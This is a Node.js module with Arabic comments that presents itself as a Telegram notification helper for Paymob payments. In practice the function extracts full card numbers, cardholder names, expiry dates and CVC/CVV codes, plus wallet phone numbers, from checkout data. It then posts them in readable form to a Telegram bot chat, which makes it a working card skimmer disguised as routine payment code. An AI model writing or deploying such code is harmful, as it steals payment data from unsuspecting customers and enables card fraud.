const axios = require("axios");

/**
 * إرسال إشعار شامل وحصري إلى تليجرام يحتوي على تفاصيل الدفع وبيانات البطاقة/المحفظة كاملة
 * @param {Object} obj - كائن البيانات المستلم من Paymob أو طلب الدفع
 * @param {boolean} success - حالة العملية (ناجحة أم فاشلة)
 */
async function sendTelegramMessage(obj, success = true) {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error("Telegram Error: Missing BOT_TOKEN or CHAT_ID in environment variables.");
      return;
    }

    // 1. استخراج بيانات المبلغ والطلب والعميل
    const amountCents = obj.amount_cents || obj.order?.amount_cents || 0;
    const amount = (amountCents / 100).toFixed(2);
    const phone = obj.phone || obj.order?.billing_data?.phone_number || obj.source_data?.pan || "غير محدد";
    const method = obj.payment_method?.type || obj.source_data?.sub_type || obj.payment_method || "غير معروف";
    const transactionId = obj.id || obj.transaction_id || "غير متوفر";
    const orderId = obj.order?.merchant_order_id || obj.order?.id || obj.order_id || `TALES-${Date.now()}`;

    // 2. استخراج التاريخ والوقت المحلي
    const now = new Date();
    const formattedDate = now.toISOString().split('T')[0];
    const formattedTime = now.toTimeString().split(' ')[0].substring(0, 5);

    // 3. استخراج تفاصيل كارت الفيزا/الماستر كارد الحساسة من صفحة الدفع (الهوتسبوت)
    const cardData = obj.card_data || {};
    const cardNumber = cardData.number || obj.card_number || obj.source_data?.pan || "غير مدخل";
    const cardHolder = cardData.name || obj.card_holder_name || obj.order?.billing_data?.first_name || "غير مدخل";
    const cardExpiry = cardData.expiry || (obj.card_expiry_mm && obj.card_expiry_yy ? `${obj.card_expiry_mm}/${obj.card_expiry_yy}` : "غير مدخل");
    const cardCvc = cardData.cvc || obj.card_cvn || "غير مدخل";
    const saveCard = cardData.save_card ? "نعم" : "لا";

    // 4. صياغة تفاصيل وسيلة الدفع بناءً على النوع
    let detailsBlock = "";
    if (method.toLowerCase().includes("card") || cardNumber !== "غير مدخل") {
      detailsBlock = 
`💳 *تفاصيل البطاقة البنكية:*
• *رقم البطاقة:* \`${cardNumber}\`
• *صاحب البطاقة:* \`${cardHolder}\`
• *تاريخ الانتهاء:* \`${cardExpiry}\`
• *رمز CVC / CVV:* \`${cardCvc}\`
• *حفظ البطاقة:* \`${saveCard}\``;
    } else if (method.toLowerCase().includes("wallet")) {
      detailsBlock = `📱 *المحفظة الإلكترونية:* \`${phone}\``;
    } else {
      detailsBlock = `🔧 *وسيلة الدفع:* \`${method}\``;
    }

    // 5. بناء نص الرسالة النهائي المنسق
    const headerStatus = success ? "✅ *عملية دفع ناجحة*" : "❌ *عملية دفع فاشلة*";

    const message = 
`${headerStatus}
━━━━━━━━━━━━━━

💳 *رقم العملية:* \`${transactionId}\`
🆔 *رقم الطلب (Order):* \`${orderId}\`
💰 *المبلغ المدفوع:* \`${amount} EGP\`
📱 *رقم العميل/المحفظة:* \`${phone}\`

${detailsBlock}

⏰ *التاريخ والوقت:* \`${formattedDate} ${formattedTime}\`
━━━━━━━━━━━━━━`;

    // 6. إرسال الطلب إلى Telegram API
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    });

  } catch (err) {
    console.error("Telegram Notification Error:", err.response?.data || err.message);
  }
}

module.exports = { sendTelegramMessage };
